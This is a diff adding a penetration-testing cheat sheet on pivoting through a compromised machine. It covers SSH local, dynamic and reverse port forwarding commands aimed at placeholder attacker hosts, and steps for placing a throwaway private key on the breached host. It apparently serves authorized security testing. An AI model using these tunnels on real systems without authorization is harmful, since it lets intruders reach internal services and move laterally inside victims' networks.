@@ -1,0 +1,37 @@
+***************************************************************************************************************************************************************************
+*** PORTFORWARDING/PROXY from compromised machines
+***************************************************************************************************************************************************************************
+
+** NOTE: Never enter your attack machine password to create reverse connections for proxy or portforwarding from a compromised machine. Instead use a Key based system. **
+
+Port forwarding on a compromised machine to the Attacker machine
+
+> ssh -L <ATTACKER's PORT>:<TARGET IP>:<TARGET PORT> <ATTACKER's USERNAME>@<ATTACKER's IP> -fN
+
+Proxy from a compromised machine to the Attacker machine
+
+> ssh -D <ATTACKER's PORT> <ATTACKER's USERNAME>@<ATTACKER's IP> -fN
+
+***************************************************************************************************************************************************************************
+** Steps to create proxy/portforwarding from a compromised machine to the attack machine **
+***************************************************************************************************************************************************************************
+
+* Use 'ssh-keygen' to create a set of key's on your local attack machine. This creates a private key - public key pair on your attack machine.
+
+* Copy the content of your public key in your '.ssh/authorized_key' file with the following edit:
+
+> command="echo 'This account can only be used for port forwarding'",no-agent-forwarding,no-x11-forwarding,no-pty <PUBLIC KEY CONTENT>
+
+* Now copy the content of your private key to a file on the compromised machine.
+(This is usually an absolute no-no, which is why we generated a throwaway set of SSH keys to be discarded as soon as the engagement is over.)
+
+* Now use the following command to create a portforward from the compromised machine to the attack machine:
+
+> ssh -R <ATTACKER's PORT>:<TARGET IP>:<TARGET PORT> <ATTACKER's USERNAME>@<ATTACKER's IP> -i <PRIVATE KEY file> -fN
+
+* Or use the following command to create a proxy from the compromised machine to the attack machine:
+
+> ssh -R <ATTACKER's PORT> <ATTACKER's USERNAME>@<ATTACKER's IP> -i <PRIVATE KEY FILE> -fN
+
+** NOTE: These methods are done when there are other target machines whose services are only accessible over the compromised machine ports in which case you 'forward the ports / proxy' to enable access to those services on the attacker's machine. **
+***************************************************************************************************************************************************************************
